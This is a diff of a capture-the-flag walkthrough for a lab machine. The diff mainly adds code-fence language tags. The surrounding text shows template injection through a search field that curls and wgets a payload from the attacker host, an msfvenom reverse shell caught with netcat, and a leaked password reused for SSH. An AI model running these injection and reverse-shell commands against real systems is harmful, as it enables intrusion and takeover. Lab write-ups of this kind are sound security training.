@@ -6,7 +6,7 @@
 
 Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-
 
-```
+```sh
 $ export IP=10.10.11.170
 $ echo $IP
 10.10.11.170
@@ -14,7 +14,7 @@ $ echo $IP
 
 and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.
 
-```
+```sh
 $ ping $IP
 PING 10.10.11.170 (10.10.11.170) 56(84) bytes of data.
 64 bytes from 10.10.11.170: icmp_seq=1 ttl=63 time=69.3 ms
@@ -35,13 +35,13 @@ First step after spawning in the target machine and connected to the VPN, I star
 `-v`: Verbose output for more information about the scan
 `-oN`: Write the output of the scan into a file
 
-```
+```shell
 $ nmap -sV -sC -p- -v -oN scan.nmap $IP
 ```
 
 After the scan is complete, here's the result:
 
-```
+```shell
 Nmap scan report for 10.10.11.170
 Host is up (0.12s latency).
 Not shown: 65533 closed tcp ports (conn-refused)
@@ -101,7 +101,7 @@ The next step I will be trying to get a reverse shell to the target machine, so 
 
 After some reading, I found that `*{T(java.lang.Runtime).getRuntime().exec('')}` can run shell commands through the search field. So I started a Python http server to see if I can get the target machine to connect to my server. At first I entered in the search field `${T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.2:80')}`:
 
-```
+```shell
 $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.170 - - [16/Sep/2022 01:25:32] "GET / HTTP/1.1" 200 -
@@ -115,7 +115,7 @@ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f elf > p
 
 Before uploading the payload to the target machine, I started listening on port 1337 using netcat:
 
-```
+```shell
 $ nc -lvnp 1337                        
 listening on [any] 1337 ...
 
@@ -123,7 +123,7 @@ listening on [any] 1337 ...
 
 And now time to upload the payload. first I uploaded the payload, then I had to change the permissions to execute the payload file, then run it, using the following queries in the search field:
 
-```
+```java
 *{T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.5/payload.elf")}
 *{T(java.lang.Runtime).getRuntime().exec("chmod 777 payload.elf")}
 *{T(java.lang.Runtime).getRuntime().exec("./payload.elf")}
@@ -131,7 +131,7 @@ And now time to upload the payload. first I uploaded the payload, then I had to 
 
 And we finally got a reverse shell! to make the shell more interactive I executed the following commands:
 
-```
+```shell
 connect to [10.10.16.2] from (UNKNOWN) [10.10.11.170] 51030
 whoami
 woodenk
@@ -158,7 +158,7 @@ woodenk@redpanda:/tmp/hsperfdata_woodenk$
 
 The user flag can be found in /home/woodenk/user.txt
 
-```
+```shell
 woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /home
 cd /home
 woodenk@redpanda:/home$ ls
@@ -188,7 +188,7 @@ This means that the source files of that web application are located there, whic
 
 I started looking at the directories/files in this location by using `ls -R`, I'm gonna show what caught my attention:
 
-```
+```shell
 woodenk@redpanda:/opt/panda_search/src$ ls -R
 ls -R
 
@@ -204,12 +204,14 @@ MainController.java  PandaSearchApplication.java  RequestInterceptor.java
 
 I started with `MainController.java` and read through the code trying to roughly understand what's happening, and the following block of code might be useful:
 
-```
+```shell
 woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
 cat MainController.java
+```
 
-
-...
+```java
+{
+   ///////
 
 	 public ArrayList searchPanda(String query) {
 
@@ -238,7 +240,7 @@ cat MainController.java
 
 In this section we can see that the password of the user `woodenk` on the sql server is `RedPandazRule`, and since port 22 is open and running `OpenSSH` according to the scan at the beginning, I tried to connect through SSH with the username koodenk and this passphrase.
 
-```
+```shell
 $ ssh woodenk@10.10.11.170
 woodenk@10.10.11.170's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
@@ -271,7 +273,7 @@ woodenk@redpanda:~$
 
 I connected to the mysql server to see if there's anything that might be interesting:
 
-```
+```bash
 woodenk@redpanda:-$ mysql -u woodenk -p -D red_panda
 Enter password: 
 
@@ -328,7 +330,7 @@ find / -group logs 2>/dev/null
 
 After some googling, I found a tool that can be useful, [pspy](https://github.com/DominicBreuker/pspy) which is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. And I found that a jar file is being executed every once in a while, so I went to take a look at it
 
-```
+```bash
 ...
 CMD: UID=0    PID=92567  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
 ...
